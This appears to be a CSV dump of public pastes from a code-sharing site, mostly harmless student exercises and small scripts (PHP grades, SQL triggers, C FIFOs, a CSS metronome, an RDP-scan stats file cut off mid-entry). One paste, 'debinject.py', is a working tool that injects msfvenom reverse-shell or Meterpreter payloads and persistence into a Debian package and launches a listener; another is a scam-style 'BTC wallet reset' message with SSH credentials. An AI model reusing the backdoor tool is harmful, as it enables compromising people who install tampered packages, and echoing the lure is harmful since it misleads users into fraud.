id,title,username,language,date,content
q3ZL9q5a,Untitled,sarjsarj,PHP,Thursday 9th of November 2023 11:55:22 PM CDT,"if (isset($_POST['save_grades'])) {
    // Check if the button with name 'save_grades' was clicked

    foreach ($_POST['gradeInput'] as $studentKey => $grade) {
        // Split the $studentKey to get section and student numbers
        list($section, $student) = explode('_', $studentKey);

        // Construct studentName based on the section and student number
        $studentName = ""SEC"" . $section . ""_STUD"" . $student;

        // Use prepared statements to insert data into the ""midtermexam2"" table
        $insertQuery = ""INSERT INTO midtermexam2 (studentName, subject, section, grade) VALUES (?, ?, ?, ?)"";
        $stmt = $conn->prepare($insertQuery);
        $stmt->bind_param(""sssd"", $studentName, $subject, $section, $grade);

        // Execute the insert query
        if ($stmt->execute()) {
            // Data inserted successfully
            echo ""Grade for Section $section, Student $student inserted successfully.<br>"";
        } else {
            // Handle error if the insertion fails
            echo ""Error inserting grade for Section $section, Student $student: "" . $conn->error . ""<br>"";
        }
    }
}"
Gym6ve8W,Raspberry PI 4 Over Clock Settings,rehannali,autoconf,Thursday 9th of November 2023 11:53:15 PM CDT,"[all]
force_turbo=1
arm_freq=2147
arm_freq_min=100
gpu_freq=750
gpu_freq_min=100
over_voltage=8
over_voltage_min=-16
hdmi_group=2
hdmi_mode=82
hdmi_force_hotplug=1"
PZq31hk2,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Thursday 9th of November 2023 11:52:46 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT750419"
ZtSLbSeV,rolling square metronome,Mangus875,HTML,Thursday 9th of November 2023 11:38:45 PM CDT,"<!DOCTYPE html>
<html>
	<head>
		<title>Animated Metronome</title>
		<style>
			:root {
			background-color: #2d2d2d;
			}
			.rolling_square {
			--bpm: 120;
			--duration: calc(240s / var(--bpm));
			position: absolute;
			left: 50%;
			top: 50%;
			width: 50vh;
			height: 50vh;
			background-color: #fff;
			transform: translate(-50%, -50%);
			}
			.rolling_square div {
			position: absolute;
			width: 50%;
			height: 50%;
			background-color: #ff5533;
			animation: roll var(--duration) ease-in infinite;
			animation-play-state:
			}
			@keyframes roll {
			0% {
			transform-origin: top right;
			transform: translate(0%, 0%);
			}
			25% {
			transform-origin: top right;
			transform: rotate(-90deg);
			}
			25.000001% {
			transform-origin: bottom right;
			transform: translate(100%, 0) rotate(0deg);
			}
			50% {
			transform-origin: bottom right;
			transform: translate(100%, 0%) rotate(-90deg);
			}
			50.000001% {
			transform-origin: bottom left;
			transform: translate(100%, 100%) rotate(0deg);
			}
			75% {
			transform-origin: bottom left;
			transform: translate(100%, 100%) rotate(-90deg);
			}
			75.000001% {
			transform-origin: top left;
			transform: translate(0%, 100%) rotate(0deg);
			}
			100% {
			transform-origin: top left;
			transform: translate(0%, 100%) rotate(-90deg);
			}
			}
			.slidecontainer {
			position: absolute;
			left: 50%;
			top: 24%;
			transform: translate(-50%, -50%);
			width: 45vh;
			display: flex;
			flex-direction: row;
			}
			.slidecontainer::before {
			transform: translateY(-60%);
			font-family: consolas;
			font-size: 20px;
			color: #fff;
			content: attr(data-bpm) "" BPM"";
			}
			.slider {
			-webkit-appearance: none;
			width: 100%;
			height: 10px;
			border-radius: 5px;
			background: #ddd;
			outline: none;
			}
			.slider::-webkit-slider-thumb {
			-webkit-appearance: none;
			appearance: none;
			width: 15px;
			height: 15px;
			border-radius: 50%;
			background: #ff5533;
			cursor: pointer;
			}
		</style>
		<script>
			var bpmSlider,met;
			
			window.onload = () => {
				bpmSlider = document.getElementById(""bpm-slider"");
				met = document.querySelector("".rolling_square div"");
				
				setInterval(() => {
					let bpm = bpmSlider.value;
					met.style.setProperty('--duration', `calc(240s / ${bpm})`);
					document.querySelector("".slidecontainer"").setAttribute(""data-bpm"", bpm);
				});
				
				document.querySelector("".rolling_square"").onclick = () => {
					let playing = getComputedStyle(met).getPropertyValue(""animation-play-state"") == ""running"";
					if (playing) {
						met.style.setProperty(""animation-play-state"", ""paused"");
						met.style.setProperty(""animation"", ""none"");
						setTimeout(() => {
							met.style.setProperty(""animation"", ""roll var(--duration) ease-in infinite"");
							met.style.setProperty(""animation-play-state"", ""paused"");
						});
						return;
					}
					met.style.setProperty(""animation-play-state"", ""running"");
				}
			}
		</script>
	</head>
	<body>
		<div class='slidecontainer' data-bpm='120'>
			<input type='range' min='10' max='360' value='120' class='slider' id='bpm-slider'>
		</div>
		<div id='metronome' class='rolling_square'>
			<div id='ticker'></div>
		</div>
	</body>
</html>"
auZkTX0B,debinject.py,FlyFar,Python,Thursday 9th of November 2023 10:28:21 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#-------------------------------
#
#      BY: UNDEADSEC from BRAZIL :)
#      Visit: https://www.youtube.com/c/UndeadSec
#      Github: https://github.com/UndeadSec/EvilURL
#      Telegram: https://t.me/UndeadSec
#
#-------------------------------
BLUE, RED, WHITE, YELLOW, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;32m', '\033[0m'
#-------------------------------
from subprocess import call
#-------------------------------
def message():
    call('clear', shell=True)
    print """"""

 --------------------{1}
┌┬┐┌─┐┌┐ ┬┌┐┌ ┬┌─┐┌─┐┌┬┐   
 ││├┤ ├┴┐││││ │├┤ │   │ BY: {1}Undead{2}Sec{1} from BRazil {0}
─┴┘└─┘└─┘┴┘└┘└┘└─┘└─┘ ┴ 
{0} --------------------{1}

"""""".format(GREEN, END, RED, YELLOW, GREEN)
#-------------------------------
def main():
    call('rm -Rf output', shell=True)
    call(""rm -Rf /tmp/evil"", shell=True)
    print '~ / Inject malicious codes into *.deb\'s\n '
    print ""{0}[-] Insert *.deb file path: {1}"".format(YELLOW, END)
    file_path = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    print ""\n{0}[-] Insert LHOST: {1}"".format(YELLOW, END)
    LHOST = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    print ""\n{0}[-] Insert LPORT: {1}"".format(YELLOW, END)
    LPORT = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    call('mkdir /tmp/evil', shell=True)
    call('cp ' + file_path + ' /tmp/evil/original.deb', shell=True)
    call('dpkg -x /tmp/evil/original.deb /tmp/evil/work', shell=True)
    call('mkdir /tmp/evil/work/DEBIAN', shell=True)
#-------------------------------
def setArch():
    print '\nInsert the target arch x86 or x64: '
    arch = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    if arch == 'x64':
        call('cp Utils/x64/control /tmp/evil/work/DEBIAN')
        call('cp Utils/x64/postinst /tmp/evil/work/DEBIAN')
    elif arch == 'x86':
        call('cp Utils/x86/control /tmp/evil/work/DEBIAN')
        call('cp Utils/x86/postinst /tmp/evil/work/DEBIAN')
    else:
        print ""\nChoose [x64] or [x86]""
#-------------------------------
def setPayload():
    print ""\n - CHOOSE THE PAYLOAD -  \n[1] metasploit/linux/<arch>/shell/reverse_tcp\n[2] metasploit/linux/<arch>/meterpreter/reverse_tcp\n[3] metasploit/linux/<arch>/meterpreter/bind_tcp\n[4] metasploit/linux/<arch>/shell/bind_tcp""
    option = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    if option == '1':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '2':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '3':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '4':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    else:
        print ""\nInvalid""
        call('exit', shell=True)
#-------------------------------
def setPersistence():
    persistence = raw_input('\nDo you want to enable persistence?(y/n) : ')
    if persistence.upper() == 'Y':
        call('cp Utils/Persistence/kernellog /tmp/evil/work/usr/games/', shell=True)
#-------------------------------
def makeEvil():
    call('chmod 755 /tmp/evil/work/DEBIAN/postinst', shell=True)
    call('cd /tmp/evil/work/DEBIAN && dpkg-deb --build /tmp/evil/work', shell=True)
    call('rm -Rf output/ && mkdir output', shell=True)
    call('mv /tmp/evil/work.deb output/backdoored.deb && chmod 755 output/backdoored.deb', shell=True)
    print ""\n The .deb backdoored saved to: /output/backdoored.deb\n""
    listen = raw_input(""Do you want to start listener? (y/n): "")
    if option != '3' and option != '4':
        if listen.upper() == ""Y"":
            if option == '1':
	        call('service postgresql start', shell=True)
                call('msfconsole -q -x ""use exploit/multi/handler;set PAYLOAD linux/' + arch + '/shell/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y""', shell=True)
	    elif option == '2':
	        call('service postgresql start')
                call('msfconsole -q -x ""use exploit/multi/handler;set PAYLOAD linux/' + arch + '/meterpreter/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y""', shell=True)
        else:
            print ""Bye :D""
    else:
        print ""\nStart Metasploit listener and Happy Hacking""
#-------------------------------
if __name__ == '__main__':
    message()
    main()
    setArch()
    setPayload()
    setPersistence()
    makeEvil()"
EiD37dKk,validator class,cirossmonteiro,Python,Thursday 9th of November 2023 10:20:05 PM CDT,"class Validator:
    def __call__(self, value):
        return self.validate(value)

class MinValidator(Validator):
    def __init__(self, minimum):
        self.minimum = minimum
        
    def validate(self, value):
        return value >= self.minimum

class MaxValidator(Validator):
    def __init__(self, maximum):
        self.maximum = maximum
        
    def validate(self, value):
        return value <= self.maximum

# big version
##class BetweenValidator(MinValidator, MaxValidator):
##    def __init__(self, minimum, maximum):
##        MinValidator.__init__(self, minimum)
##        MaxValidator.__init__(self, maximum)
##        
##    def validate(self, value):
##        return MinValidator.validate(self, value) and MaxValidator.validate(self, value)

class MergeValidators(Validator):
    validator_classes = []
    
    def __init__(self, *args):
        for index, vclass in enumerate(self.validator_classes):
            if type(args[index]) == list:
                vclass.__init__(self, *args[index])
            else:
                vclass.__init__(self, args[index])

    def validate(self, value):
        for index, vclass in enumerate(self.validator_classes):
            if not vclass.validate(self, value):
                return False

        return True
        
# small version
class BetweenValidator(MergeValidators):
    validator_classes = [
        MinValidator,
        MaxValidator
    ]

assert BetweenValidator(18, 25)(18) 
# same as ""MinValidator(18)(18) and MaxValidator(25)(18)"""
dYmDM8kx,glamiau,Arconteus,SQL,Thursday 9th of November 2023 09:34:21 PM CDT,"/*
Crear un trigger que dada una tabla llamada:
Inventario con atributos 
id_car, 
modelo_car, 
marca_car, 
anio_car, 
precio_car

al momento de asignar nuevas unidades al inventario decida a cuál de las tres agencias (Norte, Oriente y Sur) se asigna la unidad. 

La tabla afectada por el trigger se llama 
Mov_Inventario y consta de los siguientes atributos: 
id_reg, 
id_car (dato de la tabla inventario), 
marca, 
modelo, 
fecha_reg, 
usuario_reg y 
movimiento (por el momento solo registre stock). 

La acción disparadora será por tanto un insert.
*/
/*
========================================================
CREAR BASE DE DATOS
========================================================
*/
CREATE DATABASE Practica ON(
    name = Practica_dat,
    filename = 'C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\Practica.mdf',
    SIZE = 10MB,
    maxsize = 30MB,
    filegrowth = 5MB
)
log ON(
    name = Practica_log,
    filename = 'C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\Practica.ldf',
    SIZE = 5MB,
    maxsize = 30MB,
    filegrowth = 5MB
);
USE Practica
GO
/*
========================================================
CREAR TABLAS
========================================================
*/
CREATE TABLE inventario(
	id_car SMALLINT PRIMARY KEY, 
	modelo_car VARCHAR(50) NOT NULL, 
	marca_car VARCHAR(30) NOT NULL, 
	anio_car SMALLINT NOT NULL, 
	precio_car DECIMAL(10,2)
);
CREATE TABLE Mov_Inventario (
    id_reg INT PRIMARY KEY,
    id_car SMALLINT not null,
    marca VARCHAR(30) not null,
    modelo VARCHAR(50) not null,
    fecha_reg DATE not null,
    usuario_reg VARCHAR(255) not null,
    movimiento VARCHAR(255) not null,
	CONSTRAINT ""FK_ID_CAR"" FOREIGN KEY(id_car)
	REFERENCES inventario(id_car)
);
/*
========================================================
TRIGGER
========================================================
*/
CREATE TRIGGER tg_registro
ON inventario AFTER INSERT AS
BEGIN SET NOCOUNT ON;
	-- AGENCIA
	DECLARE @agencia varchar(7);
	UPDATE Mov_Inventario
    SET @agencia = 
        CASE 
            WHEN i.anio_car >= 2023 THEN 'Norte'
            WHEN i.anio_car >= 2015 AND i.anio_car < 2022 THEN 'Sur'
            ELSE 'Oriente'
        END
    FROM Mov_Inventario m, Inventario i, inserted ins
	WHERE m.id_car = i.id_car 
	AND	i.id_car = ins.id_car;
    SELECT CONCAT('La agencia: ', @agencia,' se encargara de este modelo.') AS Mensaje;
	-- INSERT INTO
	INSERT INTO Mov_Inventario (id_car, marca, modelo, fecha_reg, usuario_reg, movimiento)
    SELECT i.id_car, i.marca_car, i.modelo_car, GETDATE(), SYSTEM_USER, 'stock'
    FROM Inventario i, inserted ins 
	WHERE i.id_car = ins.id_car; 
END;
"
mfPFket7,ProveedoresVisita,orezalucard,C#,Thursday 9th of November 2023 09:08:57 PM CDT,"SELECT ROW_NUMBER() OVER(PARTITION BY P.Pro_Codigo ORDER BY P.Pro_Codigo) AS Number, P.Pro_Codigo, CONCAT(P.Pro_Nombre,' ', P.Pro_ApellidoPaterno,' ',P.Pro_ApellidoMaterno) AS NombreProveedor, PD.Pro_DiaVisita,
NE.NE_Fecha,
CONCAT(NE.FolTda_Codigo,'-',NE.FolEst_Codigo,'-',NE.FolDoc_Codigo,'-',NE.FolConsecutivo) AS Folio, NE.FolTda_Codigo,NE.FolEst_Codigo,NE.FolDoc_Codigo,NE.FolConsecutivo,
ROW_NUMBER() OVER (PARTITION BY NE.Pro_Codigo, CAST(NE.NE_Fecha AS DATE) ORDER BY NE.Pro_Codigo, CAST(NE.NE_Fecha AS DATE)) AS FilaDocumento
FROM Proveedores P
INNER JOIN ProveedoresDeta PD ON P.Pro_Codigo = PD.Pro_Codigo
LEFT JOIN NotasEntrada NE ON NE.Pro_Codigo = P.Pro_Codigo AND NE.TMA_Codigo = 1
WHERE NE.NE_Fecha BETWEEN @DesdeFecha AND @HastaFecha  AND P.Pro_Codigo BETWEEN @ProveedorInicio AND @ProveedorFinal"
py3tSh17,remove popup ads on tradingview as soon as they pop onto screen.,Build,JavaScript,Thursday 9th of November 2023 08:08:48 PM CDT,"// Callback function to handle mutations
const handleMutations = (mutationsList) => {
	for (const mutation of mutationsList) {
		if (mutation.type === ""childList"") {
			// Check if the ads element is added or removed
			const overlapManager = document.querySelector(
				""#overlap-manager-root > div:nth-child(2)""
			);
			const goPro = document.querySelector(
				""#overlap-manager-root > div:nth-child(2) > div""
			);
			const span = document.querySelector(
				""#overlap-manager-root > div:nth-child(4) > div""
			);

			if (overlapManager) {
				if (goPro) {
					console.log(""Ads found!"");
					goPro.remove();
					console.log(""Ads removed :)"");
				}
				if (span) {
					console.log(""Ads found!"");
					span.remove();
					console.log(""Ads removed :)"");
				}
			}
		}
	}
};

// Options for the MutationObserver (configuring what to observe)
const observerConfig = { childList: true, subtree: true };

// Create a MutationObserver with the callback and options
const observer = new MutationObserver(handleMutations);

// Start observing the target node (body) with the specified options
observer.observe(document.body, observerConfig);

// To stop observing (optional)
// observer.disconnect();
"
Q9zdTsZP,ExamenP1 Distributed Computing,MateoCabrera,Python,Thursday 9th of November 2023 07:49:18 PM CDT,"import csv
import ray
import time

# Función que calcula la suma de cubos de una lista de números
def suma_cubos(numbers):
    sum = 0
    for num in numbers:
        sum += num**3
    return sum

# Función para ejecutar de manera local
def run_local(file_path):
    #vamos a usar dos arreglos uno para ir almacenando la informacion y otro para recorrer una parte dle archivo
    numbers = []
    datos = []
    # abrivos el archivo que se encuentra en file_path
    with open(file_path, newline='') as archivo_csv:
        #creamos un lector de los elementos segun la orientacion en la documentacion de la libreria CSV
        lector_csv = csv.DictReader(archivo_csv)
        #iteramos cada fila ya que en el archivo por cada datos que vamos a importar
        for fila in lector_csv:
            #hacemos apencides en el arreglo para añadir los numeros
            datos.append(fila)
            numero = int(fila['numero'])
            numbers.append(numero)
            #los incertamos al arreglo de numbers
    #calculamos la sumas de los cubos de los numeros y tomamos el tiempo de ejecucion
    start_time = time.time() #esto es una funcion de python para tomar el tiempo
    resultado = suma_cubos(numbers)
    duration = time.time() - start_time
    print('Local execution time: {}'.format(duration))
    print('Resultado de la suma local es: ', resultado)
    #imprimimos los resultados de la medicion del timepo
    return datos, resultado

# Función para ejecutar de manera remota con Ray
@ray.remote #usamos este decorador para declarar nuestro tipo de ejecucion
def suma_cubos_distributed(numbers):
    return suma_cubos(numbers) #mandamos que funcion va a ejecutar remotamente

# Función que utiliza Ray para calcular la suma de cubos distribuida desde un archivo CSV
@ray.remote
def run_remota(file_path):
    # vamos a usar dos arreglos uno para ir almacenando la informacion y otro para recorrer una parte dle archivo
    numbers = []
    datos = []
    with open(file_path, newline='') as archivo_csv:
        # creamos un lector de los elementos segun la orientacion en la documentacion de la libreria CSV
        lector_csv = csv.DictReader(archivo_csv)
        # iteramos cada fila ya que en el archivo por cada datos que vamos a importar
        for fila in lector_csv:
            # hacemos apencides en el arreglo para añadir los numeros
            datos.append(fila)
            numero = int(fila['numero'])
            numbers.append(numero)
    start_time = time.time()  # esto es una funcion de python para tomar el tiempo
    resultado = suma_cubos(numbers)
    duration = time.time() - start_time
    print('Local execution time: {}'.format(duration))
    print('Resultado de la suma remota es: ', resultado)
    # imprimimos los resultados de la medicion del timepo
    return datos, resultado


# Ejecutar pruebas desde un archivo CSV (ajusta la ruta según tu caso)
file_path1 = 'datos1.csv'
file_path2 = 'datos2.csv'
file_path3 = 'datos3.csv'


#descomentar estas lineas para la ejecucion
# ---------------Llamar a la función run_local---------------
# para el archivo datos 1
#datos_local, resultado_local = run_local(file_path1)
#print('Datos 1 del archivo CSV (local):', datos_local) #esta es una funcion que nos permite ver como se lelleron los datos des archivo

# para el archivo datos 2
#datos_local, resultado_local = run_local(file_path2)
#print('Datos 2 del archivo CSV (local):', datos_local)

# para el archivo datos 3
#datos_local, resultado_local = run_local(file_path3)
#print('Datos 3 del archivo CSV (local):', datos_local)

# ---------------Llamar a la función run_remota---------------
# para el archivo datos 1
#resultado_remoto = run_remota.remote(file_path1)"
Hh3CxwR4,Untitled,okayboaa,C,Thursday 9th of November 2023 07:25:30 PM CDT,"// send.c
#include ""send.h""

void send(int id)
{

    if (id == 1)
    {
        char buffer[4];
        // sender 1
        for (int i = 0; i < 8; i++)
        {
            int fd = open(MY_FIFO, O_WRONLY);
            sprintf(buffer, ""%d%d%d"", i, i + 1, i + 2);
            write(fd, buffer, sizeof(buffer) - 1);
            sleep(1);
            close(fd);
        }
    }

    if (id == 2)
    {
        char buffer[4]; // Adjusted buffer size
        // sender 2
        for (int i = 0; i < 25; i++)
        {
            int fd = open(MY_FIFO, O_WRONLY);
            sprintf(buffer, ""%c%c%c"", i + 'a', i + 1 + 'a', i + 2 + 'a');
            write(fd, buffer, sizeof(buffer) - 1);
            sleep(1);
            close(fd);
        }
    }
}

// send.h
#ifndef SEND_H
#define SEND_H

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#define MY_FIFO ""fifo""

void send(int id);

#endif
// reader.c
#include ""send.h""

int main()
{
    mkfifo(MY_FIFO, 0666);
    int fd = open(MY_FIFO, O_RDONLY);

    for (;;)
    {
        char buffer[4];
        int n = read(fd, buffer, 4);
        if (n == 0)
        {
            continue;
        }
        puts(buffer);
    }

    close(fd);
    unlink(MY_FIFO);
}
// sender 1
#include ""send.h""

int main()
{
    send(1);
}

// sender 2
#include ""send.h""

int main()
{
    send(2);
}


// compile 
gcc -o reader reader.c
gcc -o sender1 sender1.c send.c
gcc -o sender2 sender2.c send.c"
CT0Rkdmq,9. heti házi,Levi0227,C#,Thursday 9th of November 2023 06:28:37 PM CDT,"namespace PMPHF008_P99J7Y
{
    internal class PMPHF008_P99J7Y
    {
        static void Main(string[] args)
        {
            string S = Console.ReadLine();
            string[] parts = S.Split("" "");
            string utasitas = parts[0];
            List<string> letter = new List<string>();

            int[] feszultsegek1 = new int[5];
            int[] feszultsegek2 = new int[5];
            string[,] matrixVoltage = new string[2, 5];

            //Használadnó jelsorozat nevének eltárolása listában
            if (parts.Length - 1 == 2)
            {
                letter.Add(parts[1]);
                letter.Add(parts[2]);
            }
            else if (parts.Length - 1 == 1)
            {
                letter.Add(parts[1]);
            }

            string lines = """";
            bool felvantoltve = false;
            bool igaz1 = false;
            bool igaz2 = false;

            //Bemenet felosztása kettesével és tömbökbe töltése
            #region Számok párba állítása
            while (felvantoltve != true)
            {
                lines = Console.ReadLine();
                for (int i = 0; i < letter.Count; i++)
                {
                    if (letter.Count == 2)
                    {
                        if (lines.Split("" "")[0] == letter[0])
                        {
                            int index = 0;
                            for (int j = 0; j < lines.Split("" "")[1].Length; j += 2)
                            {
                                string eleje = lines.Split("" "")[1].Substring(j, 2);
                                int kettesszamok = int.Parse(eleje);
                                feszultsegek1[index] = kettesszamok;
                                index++;
                                igaz1 = true;
                            }
                        }
                        if (lines.Split("" "")[0] == letter[1])
                        {
                            int index = 0;
                            for (int j = 0; j < lines.Split("" "")[1].Length; j += 2)
                            {
                                string eleje = lines.Split("" "")[1].Substring(j, 2);
                                int kettesszamok = int.Parse(eleje);
                                feszultsegek2[index] = kettesszamok;
                                index++;
                                igaz2 = true;
                            }

                        }
                        if (igaz1 == true && igaz2 == true)
                            felvantoltve = true;
                    }
                    else if (letter.Count == 1)
                    {
                        if (lines.Split("" "")[0] == letter[i])
                        {
                            int index = 0;
                            for (int j = 0; j < lines.Split("" "")[1].Length; j += 2)
                            {
                                string eleje = lines.Split("" "")[1].Substring(j, 2);
                                int kettesszamok = int.Parse(eleje);
                                feszultsegek1[index] = kettesszamok;
                                index++;
                            }
                            felvantoltve = true;
                        }
                    }
                }
            }
            #endregion Számok párba állítása

            //Feszültségek átkonvertálása és tárolása listákban
            #region Átkonvertálás
            if (letter.Count == 2)
            {
                for (int k = 0; k < feszultsegek1.Length; k++)
                {
                    if (feszultsegek1[k] >= 0 && feszultsegek1[k] <= 8)
                    {
                        matrixVoltage[0, k] = ""0"";
                    }
                    else if (feszultsegek1[k] >= 27 && feszultsegek1[k] <= 50)
                    {
                        matrixVoltage[0, k] = ""1"";
                    }
                    else
                    {
                        matrixVoltage[0, k] = ""E"";
                    }
                }
                for (int k = 0; k < feszultsegek2.Length; k++)
                {
                    if (feszultsegek2[k] >= 0 && feszultsegek2[k] <= 8)
                    {
                        matrixVoltage[1, k] = ""0"";
                    }
                    else if (feszultsegek2[k] >= 27 && feszultsegek2[k] <= 50)
                    {
                        matrixVoltage[1, k] = ""1"";
                    }
                    else
                    {
                        matrixVoltage[1, k] = ""E"";
                    }
                }
            }
            else if (letter.Count == 1)
            {
                for (int k = 0; k < feszultsegek1.Length; k++)
                {
                    if (feszultsegek1[k] >= 0 && feszultsegek1[k] <= 8)
                    {
                        matrixVoltage[0, k] = ""0"";
                    }
                    else if (feszultsegek1[k] >= 27 && feszultsegek1[k] <= 50)
                    {
                        matrixVoltage[0, k] = ""1"";
                    }
                    else
                    {
                        matrixVoltage[0, k] = ""E"";
                    }
                }
            }
            #endregion Átkonvertálás

            Console.Clear();

            //Logikai kapuk alapján való kiiratás
            #region Logikai Kapuk
            if (utasitas == ""AND"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == matrixVoltage[1, i] && matrixVoltage[0, i] == ""1"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(0);
                    }
                }
            }

            else if (utasitas == ""OR"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == ""1"" || matrixVoltage[1, i] == ""1"" && matrixVoltage[0, i] != ""E"" && matrixVoltage[1, i] != ""E"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(0);
                    }
                }
            }
            
            else if (utasitas == ""NOT"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == ""0"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[0, i] == ""1"")
                    {
                        Console.Write(""0"");
                    }
                    else
                    {
                        Console.Write(""E"");
                    }
                }
            }

            if (utasitas == ""NAND"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == ""1"" && matrixVoltage[1, i] == ""1"")
                    {
                        Console.Write(""0"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(""1"");
                    }
                }
            }
            
            if (utasitas == ""NOR"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == ""0"" && matrixVoltage[1, i] == ""0"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(""0"");
                    }
                }
            }

            else if (utasitas == ""XOR"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] != matrixVoltage[1, i] && matrixVoltage[0, i] != ""E"" && matrixVoltage[1, i] != ""E"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(0);
                    }
                }
            }
            
            else if (utasitas == ""XNOR"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == matrixVoltage[1, i] && matrixVoltage[0, i] != ""E"" && matrixVoltage[1, i] != ""E"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(0);
                    }
                }
            }
            #endregion Logikai Kapuk
        }
    }
}"
Gn4XeYDp,xrand escala...,Rnery,Bash,Thursday 9th of November 2023 06:18:57 PM CDT,"#!/usr/bin/env bash

find_hdmi_output() {
    local hdmi_output
    hdmi_output=$(xrandr | grep "" connected"" | grep ""HDMI"" | awk '{print $1}')
    echo ""$hdmi_output""
}

adjust_hdmi_scale() {
    local hdmi_output=""$1""
    local horizontal_scale=100
    local vertical_scale=100

    if [ -n ""$hdmi_output"" ]; then
        # Aplique as configurações de escala
        xrandr --output ""$hdmi_output"" --scale ${horizontal_scale}x${vertical_scale}
        # Se necessário, ajuste a posição da tela
        xrandr --output ""$hdmi_output"" --pos 0x0
        echo ""Escala ajustada para ${horizontal_scale}x${vertical_scale} na saída $hdmi_output""
    fi
    echo ""Nenhuma saída HDMI encontrada.""
}

main() {
    local hdmi_output
    hdmi_output=$(find_hdmi_output)
    adjust_hdmi_scale ""$hdmi_output""
}

main
"
0JiZUi4w,2023-11-09_stats.json,rdp_snitch,JSON,Thursday 9th of November 2023 06:18:14 PM CDT,"{
  ""ip"": {
    ""51.75.160.42"": 18,
    ""172.188.48.214"": 6,
    ""87.251.75.145"": 6,
    ""167.94.138.52"": 3,
    ""167.94.138.36"": 3,
    ""205.210.31.22"": 9,
    ""36.91.222.100"": 6,
    ""107.175.137.135"": 15,
    ""185.170.144.3"": 6,
    ""212.70.149.146"": 9,
    ""87.251.75.120"": 3,
    ""198.235.24.195"": 9,
    ""13.94.102.91"": 36,
    ""45.252.182.90"": 9,
    ""141.98.11.128"": 6,
    ""77.90.185.132"": 3,
    ""62.204.41.146"": 21,
    ""45.140.17.16"": 3,
    ""206.189.91.84"": 15,
    ""165.154.119.158"": 3,
    ""111.61.253.55"": 3,
    ""61.85.244.232"": 3,
    ""62.68.147.43"": 3,
    ""62.122.184.165"": 6,
    ""152.89.198.133"": 6,
    ""205.210.31.158"": 9,
    ""79.173.173.37"": 3,
    ""87.251.75.64"": 3,
    ""94.232.41.30"": 3,
    ""87.107.190.135"": 3,
    ""212.83.189.163"": 3,
    ""103.212.136.125"": 18,
    ""87.251.75.179"": 6,
    ""104.128.67.122"": 9,
    ""198.235.24.151"": 9,
    ""103.56.6.170"": 3,
    ""106.116.169.71"": 3
  },
  ""asn"": {
    ""AS16276"": 18,
    ""AS8075"": 42,
    ""AS208091"": 21,
    ""AS398324"": 6,
    ""AS396982"": 36,
    ""AS7713"": 6,
    ""AS36352"": 15,
    ""AS197414"": 6,
    ""AS204428"": 9,
    ""AS48011"": 9,
    ""AS209605"": 6,
    ""AS198465"": 3,
    ""AS59425"": 21,
    ""AS198953"": 3,
    ""AS14061"": 15,
    ""AS135377"": 3,
    ""AS24547"": 3,
